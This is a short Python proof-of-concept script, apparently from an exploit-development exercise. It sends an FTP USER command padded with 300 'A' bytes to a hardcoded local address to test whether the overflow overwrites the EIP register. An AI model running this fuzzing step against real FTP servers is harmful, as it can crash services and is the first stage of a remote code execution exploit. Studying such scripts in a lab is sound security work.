#!/usr/bin/python
import socket

# Part 2 of proof of concept by Vry4n
# This script is intended send all the buffer size in one packet, we need to see if EIP value gets overwritten 41414141 (AAAA)

FUZZ = "A" * 300

print("Fuzzing with {} bytes".format(len(FUZZ)))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("192.168.0.5", 21))
s.recv(1024)
s.send(b"USER " + FUZZ.encode() + b"\r\n")
s.close()
